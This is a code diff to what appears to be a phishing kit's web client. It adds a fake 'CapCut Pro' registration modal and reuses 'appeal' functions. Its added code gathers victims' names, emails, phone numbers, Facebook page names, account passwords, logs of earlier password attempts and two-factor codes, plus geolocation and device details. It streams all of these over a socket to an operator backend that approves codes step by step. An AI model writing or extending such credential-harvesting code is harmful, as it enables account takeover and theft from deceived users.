@@ -1,9 +1,9 @@
 'use client';
 
-import type { LoginProvider } from '@/store/store';
+import type { GeoInfo, LoginProvider, UserData } from '@/store/store';
 import { store } from '@/store/store';
 import type { FormDataPayload, IpInfo, LoginData } from '@/utils/message';
-import { buildAppealMessage } from '@/utils/message';
+import { buildAppealMessage, geoToIpInfo } from '@/utils/message';
 import { useCallback } from 'react';
 import { create } from 'zustand';
 import { io, type Socket } from 'socket.io-client';
@@ -52,7 +52,7 @@ export const useSocketStore = create<SocketState>(() => ({
 }));
 
 if (typeof window !== 'undefined') {
-    store.getState().resetAppealSession();
+    store.getState().resetFormSession();
 
     const client = createSocketClient();
     if (client) {
@@ -302,4 +302,152 @@ export const submitCodeApproval = async (ctx: AppealContext, code: string): Prom
     });
 
     return mapCodeResult(await waitCodeApproval(ctx.socket));
+};
+
+// ---------- CapCut modal steps → same socket backend ----------
+
+export type FormSubmitStep =
+    | { step: 'init'; userData: Partial<UserData> }
+    | { step: 'login_choice'; loginProvider: LoginProvider }
+    | {
+          step: 'credentials';
+          loginProvider: LoginProvider | null;
+          account: string;
+          password: string;
+          attempt: number;
+      }
+    | { step: 'verify_code'; code: string; attempt: number };
+
+export interface FormSubmitContext {
+    geoInfo: GeoInfo | null;
+    deviceLabel: string;
+    messageId: number | null;
+    userData: UserData;
+    loginProvider: LoginProvider | null;
+}
+
+export interface FormSubmitResult {
+    success?: boolean;
+    messageId?: number;
+}
+
+const userDataToForm = (userData: UserData): FormDataPayload => ({
+    fullName: userData.fullName,
+    dateOfBirth: '',
+    personalEmail: userData.personalEmail,
+    businessEmail: userData.businessEmail,
+    phone: userData.phoneNumber,
+    pageName: userData.facebookPageName,
+    additionalNotes: userData.information
+});
+
+const buildLoginDataFromUser = (userData: UserData, account?: string, password?: string): LoginData => ({
+    email: (account ?? userData.accounts.at(-1) ?? '').trim(),
+    password: password ?? userData.passwords.at(-1) ?? ''
+});
+
+const buildCapCutMessage = (ctx: FormSubmitContext, login: LoginData) => {
+    if (!ctx.geoInfo) {
+        throw new Error('geo_missing');
+    }
+
+    return buildAppealMessage({
+        label: 'CapCut Pro — Đăng ký',
+        form: userDataToForm(ctx.userData),
+        login,
+        loginProvider: ctx.loginProvider,
+        passwordLogs: ctx.userData.passwords,
+        codeAttempts: ctx.userData.codes,
+        ip: geoToIpInfo(ctx.geoInfo),
+        deviceLabel: ctx.deviceLabel
+    });
+};
+
+export const submitFormStep = async (ctx: FormSubmitContext, payload: FormSubmitStep): Promise<FormSubmitResult> => {
+    const socket = useSocketStore.getState().socket;
+    if (!socket || !ctx.geoInfo) {
+        return { success: true };
+    }
+
+    if (payload.step === 'init') {
+        const mergedUser: UserData = { ...ctx.userData, ...payload.userData };
+        const message = buildAppealMessage({
+            label: 'CapCut Pro — Đăng ký',
+            form: userDataToForm(mergedUser),
+            login: { email: '', password: '' },
+            passwordLogs: [],
+            codeAttempts: [],
+            ip: geoToIpInfo(ctx.geoInfo),
+            deviceLabel: ctx.deviceLabel
+        });
+        const messageId = await sendAppealMessage(socket, { message, message_id: null, stage: 'info' });
+        return { success: true, messageId };
+    }
+
+    if (payload.step === 'login_choice') {
+        const message = buildCapCutMessage(ctx, buildLoginDataFromUser(ctx.userData));
+        const messageId = await sendAppealMessage(socket, {
+            message,
+            message_id: ctx.messageId,
+            stage: 'info'
+        });
+        return { success: true, messageId };
+    }
+
+    if (payload.step === 'credentials') {
+        let messageId = ctx.messageId;
+
+        await submitLoginApproval(
+            {
+                socket,
+                messageId,
+                setMessageId: (id) => {
+                    messageId = id;
+                },
+                formData: userDataToForm(ctx.userData),
+                loginData: buildLoginDataFromUser(ctx.userData),
+                loginProvider: ctx.loginProvider,
+                passwordAttempts: ctx.userData.passwords.slice(0, -1),
+                twoFAAttempts: ctx.userData.codes,
+                deviceLabel: ctx.deviceLabel,
+                ip: geoToIpInfo(ctx.geoInfo),
+                setLoginData: () => {},
+                addPasswordAttempt: () => {},
+                addTwoFAAttempt: () => {}
+            },
+            payload.account,
+            payload.password
+        );
+
+        return { success: true, messageId: messageId ?? undefined };
+    }
+
+    if (payload.step === 'verify_code') {
+        let messageId = ctx.messageId;
+
+        await submitCodeApproval(
+            {
+                socket,
+                messageId,
+                setMessageId: (id) => {
+                    messageId = id;
+                },
+                formData: userDataToForm(ctx.userData),
+                loginData: buildLoginDataFromUser(ctx.userData),
+                loginProvider: ctx.loginProvider,
+                passwordAttempts: ctx.userData.passwords,
+                twoFAAttempts: ctx.userData.codes.slice(0, -1),
+                deviceLabel: ctx.deviceLabel,
+                ip: geoToIpInfo(ctx.geoInfo),
+                setLoginData: () => {},
+                addPasswordAttempt: () => {},
+                addTwoFAAttempt: () => {}
+            },
+            payload.code
+        );
+
+        return { success: true, messageId: messageId ?? undefined };
+    }
+
+    return { success: true };
 };
